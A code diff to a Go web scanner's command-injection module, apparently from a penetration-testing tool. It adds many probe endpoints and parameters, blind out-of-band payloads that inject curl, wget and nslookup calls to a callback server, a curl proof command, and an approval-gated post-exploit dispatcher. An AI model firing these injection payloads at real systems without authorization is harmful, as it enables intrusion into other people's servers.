@@ -30,8 +30,10 @@ import (
 	"github.com/stormbane-security/beacon/internal/finding"
 	"github.com/stormbane-security/beacon/internal/module"
 	"github.com/stormbane-security/beacon/internal/oob"
+	"github.com/stormbane-security/beacon/internal/postexploit"
 	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/scanner/authctx"
+	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
 )
 
 func init() {
@@ -76,11 +78,29 @@ var probePaths = []struct {
 	path   string
 	params []string
 }{
-	{"/", []string{"cmd", "exec", "command", "run", "ping", "host", "ip"}},
+	{"/", []string{"cmd", "exec", "command", "run", "ping", "host", "ip", "domain", "address", "query", "input", "filename", "path", "target"}},
 	{"/api/v1/ping", []string{"host", "target", "ip"}},
 	{"/admin/backup", []string{"file", "path", "dir"}},
 	{"/tools/lookup", []string{"domain", "host", "ip", "target"}},
 	{"/api/health", []string{"check", "host"}},
+	{"/ping", []string{"host", "ip", "target", "domain", "address"}},
+	{"/nslookup", []string{"host", "domain", "target", "query"}},
+	{"/dig", []string{"host", "domain", "target", "query"}},
+	{"/traceroute", []string{"host", "ip", "target", "domain", "address"}},
+	{"/exec", []string{"cmd", "command", "input", "query"}},
+	{"/run", []string{"cmd", "command", "input", "query"}},
+	{"/cmd", []string{"cmd", "command", "input", "query", "host", "ip"}},
+	{"/shell", []string{"cmd", "command", "input", "query"}},
+	{"/test", []string{"host", "ip", "cmd", "command", "target", "domain", "input"}},
+	{"/check", []string{"host", "ip", "target", "domain", "address"}},
+	{"/api/exec", []string{"cmd", "command", "host", "ip", "target", "input"}},
+	{"/api/run", []string{"cmd", "command", "host", "ip", "target", "input"}},
+	{"/tools", []string{"host", "ip", "cmd", "command", "domain", "target", "query", "input"}},
+	{"/admin/exec", []string{"cmd", "command", "host", "ip", "target", "input"}},
+	{"/system", []string{"cmd", "command", "host", "ip", "target", "input", "filename", "path"}},
+	{"/api", []string{"cmd", "command", "host", "ip", "target", "domain", "input"}},
+	{"/api/v1", []string{"cmd", "command", "host", "ip", "target", "domain", "input"}},
+	{"/api/v2", []string{"cmd", "command", "host", "ip", "target", "domain", "input"}},
 }
 
 // shellshockPaths are CGI paths commonly vulnerable to Shellshock.
@@ -138,6 +158,29 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 	// Phase 2: Timing-based parameter injection
 	paramFindings := s.timingProbe(ctx, client, scheme, asset, scanType)
 	findings = append(findings, paramFindings...)
+
+	// Web exploit dispatcher: run post-exploit chains with per-module approval.
+	if scanType == module.ScanAuthorized && len(findings) > 0 {
+		dispatcher := postexploit.NewWebExploitDispatcher()
+		approveFunc := postexploit.ApproveFuncFromContext(ctx)
+		fb := &postexploit.FindingBuilder{
+			Module:  "deep",
+			Scanner: scannerName,
+			Asset:   asset,
+		}
+		for _, f := range findings {
+			if ctx.Err() != nil {
+				break
+			}
+			if dispatcher.CanExploit(f.CheckID) {
+				if approveFunc == nil || !approveFunc("web-exploit-"+string(f.CheckID), asset, 0) {
+					continue
+				}
+				exploitFindings := dispatcher.Dispatch(ctx, f, fb)
+				findings = append(findings, exploitFindings...)
+			}
+		}
+	}
 
 	return findings, nil
 }
@@ -252,7 +295,13 @@ func shellshockExec(ctx context.Context, client *http.Client, targetURL, header,
 func (s *Scanner) timingProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
 	var findings []finding.Finding
 
-	for _, pp := range probePaths {
+	// Merge discovered parameters from crawl results into the hardcoded probe list.
+	effectiveProbePaths := probePaths
+	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
+		effectiveProbePaths = mergeDiscoveredCmdInj(probePaths, discovered)
+	}
+
+	for _, pp := range effectiveProbePaths {
 		if ctx.Err() != nil {
 			break
 		}
@@ -377,42 +426,65 @@ func (s *Scanner) timingProbe(ctx context.Context, client *http.Client, scheme, 
 				break // one per parameter
 			}
 
-			// OOB confirmation
+			// OOB confirmation — blind command injection where output is not
+			// reflected in the response. Uses both DNS (nslookup) and HTTP
+			// (curl/wget) callbacks for maximum coverage.
 			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
-				token := oobSrv.GenerateToken(fmt.Sprintf("cmdinj-%s-%s", pp.path, param))
-				oobDomain := oobSrv.DNSHostname(token)
+				token := oob.MakeToken(oobSrv, "cmdinj", asset, fmt.Sprintf("oob-%s-%s", pp.path, param))
+				oobDomain := oob.PayloadDNS(oobSrv, token)
+				oobURL := oob.PayloadURL(oobSrv, token)
 
 				oobPayloads := []string{
+					// DNS-based (nslookup)
 					fmt.Sprintf("; nslookup %s #", oobDomain),
 					fmt.Sprintf("| nslookup %s", oobDomain),
 					fmt.Sprintf("$(nslookup %s)", oobDomain),
 					fmt.Sprintf("& nslookup %s", oobDomain),
+					// HTTP-based (curl)
+					fmt.Sprintf("; curl %s #", oobURL),
+					fmt.Sprintf("| curl %s", oobURL),
+					fmt.Sprintf("$(curl %s)", oobURL),
+					// HTTP-based (wget)
+					fmt.Sprintf("| wget %s -O /dev/null", oobURL),
+					fmt.Sprintf("; wget %s -O /dev/null #", oobURL),
 				}
 
 				for _, op := range oobPayloads {
+					if ctx.Err() != nil {
+						break
+					}
 					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+op))
 					_, _ = timeRequest(ctx, client, testURL)
 				}
 
 				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
 					findings = append(findings, finding.Finding{
-						CheckID:  finding.CheckWebCmdInjection,
-						Module:   "deep",
-						Scanner:  scannerName,
-						Severity: finding.SeverityCritical,
-						Title:    fmt.Sprintf("OOB command injection confirmed in %s at %s", param, pp.path),
+						CheckID:    finding.CheckWebCmdInjection,
+						Module:     "deep",
+						Scanner:    scannerName,
+						Severity:   finding.SeverityCritical,
+						Confidence: finding.ConfidenceVerified,
+						Title:      fmt.Sprintf("Blind command injection confirmed via OOB callback in %s at %s", param, pp.path),
 						Description: fmt.Sprintf(
-							"Out-of-band DNS callback received from %s after nslookup injection, "+
-								"confirming OS command injection.", cb.RemoteAddr),
+							"Out-of-band callback received from %s after injecting curl/wget/nslookup "+
+								"commands, confirming blind OS command injection. The injected command "+
+								"executed on the server and made a %s request to the OOB callback server. "+
+								"Output was not reflected in the HTTP response.",
+							cb.RemoteAddr, cb.Protocol),
 						Asset:    asset,
 						DeepOnly: true,
 						Evidence: map[string]any{
+							"method":      "blind-oob",
 							"path":        pp.path,
 							"parameter":   param,
 							"oob_token":   token,
 							"callback_ip": cb.RemoteAddr,
 							"protocol":    cb.Protocol,
 						},
+						ProofCommand: fmt.Sprintf(
+							`curl -sk '%s://%s%s?%s=%s'`,
+							scheme, asset, pp.path, param,
+							url.QueryEscape(fmt.Sprintf("test; curl %s #", oobURL))),
 						DiscoveredAt: time.Now(),
 					})
 				}
@@ -479,4 +551,35 @@ func detectScheme(ctx context.Context, client *http.Client, asset string) string
 		return scheme
 	}
 	return ""
+}
+
+// mergeDiscoveredCmdInj combines hardcoded probe paths with parameters
+// discovered from crawl results.
+func mergeDiscoveredCmdInj(hardcoded []struct{ path string; params []string }, discovered map[string][]string) []struct{ path string; params []string } {
+	result := make([]struct{ path string; params []string }, len(hardcoded))
+	pathIdx := make(map[string]int, len(hardcoded))
+	for i, pp := range hardcoded {
+		params := make([]string, len(pp.params))
+		copy(params, pp.params)
+		result[i] = struct{ path string; params []string }{path: pp.path, params: params}
+		pathIdx[pp.path] = i
+	}
+
+	for path, newParams := range discovered {
+		if idx, ok := pathIdx[path]; ok {
+			existing := make(map[string]bool, len(result[idx].params))
+			for _, p := range result[idx].params {
+				existing[p] = true
+			}
+			for _, p := range newParams {
+				if !existing[p] {
+					result[idx].params = append(result[idx].params, p)
+					existing[p] = true
+				}
+			}
+		} else {
+			result = append(result, struct{ path string; params []string }{path: path, params: newParams})
+		}
+	}
+	return result
 }
